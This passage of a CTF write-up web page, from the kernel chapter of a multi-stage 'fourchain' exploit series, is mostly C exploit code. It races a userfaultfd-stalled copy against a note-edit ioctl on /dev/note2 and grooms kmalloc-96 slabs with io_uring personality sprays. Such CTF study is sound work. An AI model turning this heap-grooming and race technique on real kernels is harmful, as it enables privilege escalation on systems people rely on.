        <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">userfault_fd</span><span class="p">,</span> <span class="n">UFFDIO_API</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">api</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"ioctl(UFFDIO_API)"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">userfault_pthread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">userfault_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"userfaultfd initialized"</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Register a region with userfaultfd and make it inaccessible. The region must</span>
<span class="c1">// be page-aligned and the size must be a multiple of the page size.</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">userfaultfd_register</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">assert</span><span class="p">(((</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">addr</span> <span class="o">%</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;=</span> <span class="mh">0x1000</span> <span class="o">&amp;&amp;</span> <span class="n">len</span> <span class="o">%</span> <span class="mh">0x1000</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">uffdio_register</span> <span class="n">reg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">range</span> <span class="o">=</span> <span class="p">{</span>
            <span class="p">.</span><span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span>
            <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">len</span><span class="p">,</span>
        <span class="p">},</span>
        <span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="n">UFFDIO_REGISTER_MODE_MISSING</span><span class="p">,</span>
    <span class="p">};</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">userfault_fd</span><span class="p">,</span> <span class="n">UFFDIO_REGISTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reg</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"ioctl(UFFDIO_REGISTER)"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">#define OBJS_PER_SLAB 32
#define CPU_PARTIAL 30
</span>

<span class="kt">int</span> <span class="n">uring_spray_fd</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int64_t</span> <span class="nf">cc_alloc_kmalloc96</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/* This will allocate a io uring identity in kmalloc-96. It can be repeated an arbitrary amount of times for a single uring instance. */</span>
    <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_register</span><span class="p">,</span> <span class="n">uring_spray_fd</span><span class="p">,</span> <span class="n">IORING_REGISTER_PERSONALITY</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"alloc: io_uring_register() failed"</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">cc_free_kmalloc96</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">personality</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_register</span><span class="p">,</span> <span class="n">uring_spray_fd</span><span class="p">,</span> <span class="n">IORING_UNREGISTER_PERSONALITY</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">personality</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"free: io_uring_register() failed"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">pthread_t</span> <span class="n">edit_thread</span><span class="p">;</span>

    <span class="n">pin_cpu</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">rlimit_increase</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">note_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/note2"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"Failed to open note fd"</span><span class="p">);</span>

    <span class="cm">/* Free any remaining notes from a previous attempt. */</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="n">ioctl_arg</span> <span class="n">arg</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="n">i</span><span class="p">};</span>
        <span class="n">ioctl</span><span class="p">(</span><span class="n">note_fd</span><span class="p">,</span> <span class="n">IO_DEL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arg</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="n">userfaultfd_init</span><span class="p">();</span>

    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"mmap fault memory"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">uring_spray_fd</span> <span class="o">=</span> <span class="n">uring_create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">kmalloc96_cc</span> <span class="o">=</span> <span class="n">cc_init</span><span class="p">(</span><span class="n">OBJS_PER_SLAB</span><span class="p">,</span> <span class="n">CPU_PARTIAL</span><span class="p">,</span> <span class="n">cc_alloc_kmalloc96</span><span class="p">,</span> <span class="n">cc_free_kmalloc96</span><span class="p">);</span>

    <span class="n">userfaultfd_register</span><span class="p">(</span><span class="n">mem</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">);</span>

    <span class="cm">/* allocate a bunch of kmalloc96 objects, so the next one we allocate will fall into our "victim page" */</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span>
    <span class="n">note_add</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="mi">96</span><span class="p">);</span>

    <span class="cm">/* also fill up the victim page */</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span>

    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">edit_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">thread_note_edit</span><span class="p">,</span> <span class="n">mem</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">usleep</span><span class="p">(</span><span class="mi">20000</span><span class="p">);</span>
    <span class="n">note_edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">mem</span> <span class="o">+</span> <span class="mh">0x2000</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"done"</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">1000000</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="table-of-contents">Table of Contents</h2>

<ul>
  <li><a href="./fourchain-prologue">Prologue</a>: Introduction</li>
  <li><a href="./fourchain-hole">Chapter 1: Hole</a>: Using the “hole” to pwn the V8 heap and some delicious Swiss cheese.</li>
  <li><a href="./fourchain-sandbox">Chapter 2: Sandbox</a>: Pwning the Chrome Sandbox using <code class="language-plaintext highlighter-rouge">Sandbox</code>.</li>
  <li><strong><a href="./fourchain-kernel">Chapter 3: Kernel</a> (You are here)</strong></li>
  <li><a href="./fourchain-hv">Chapter 4: Hypervisor</a>: Lord of the MMIO: A Journey to IEM</li>
  <li><a href="./fourchain-fullchain">Chapter 5: One for All</a>: Uncheesing a Challenge and GUI Troubles</li>
  <li><a href="./fourchain-epilogue">Epilogue</a>: Closing thoughts</li>
</ul>




<!--       <footer class="site-footer">
        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
      </footer> -->

      <div class="lever-meme">
        <div id="lever" class="lever-off"></div>
      </div>

      <div class="twitter">
        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
      </div>

      <script>
        let leverCount = 0;
        let manic = false;

        function resetLever() {
            leverCount = 0;
            setTimeout(resetLever, 1750);
        }

        resetLever();

        document.getElementById('lever')
        .addEventListener('click', function (event) {
          if(leverCount > 10){
            manic = true;
            document.getElementById("lever").classList.add('lever-manic');
            document.getElementById("header-logo").classList.add('rainbow');
          }

          if(!manic){
            document.getElementById("lever").classList.toggle('lever-on');
            ++leverCount;
          }
        });


      </script>

      <script>
      function updateThemeToggleFooter() {
        let elem = document.querySelector('#lever');
        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
      }

      (function() {
        updateThemeToggleFooter()
      })();

      function togglePageContentLightDark() {
          var html = document.getElementsByTagName('html')[0]
          var currentClass = html.className
          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
          html.className = newClass

          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
          console.log('Cookies are now: ' + document.cookie)

          updateThemeToggleFooter()
      }

      const btn = document.querySelector("#lever");
      btn.addEventListener("click", function() {
        togglePageContentLightDark();
      });
      </script>
    </main>
  </body>
</html>
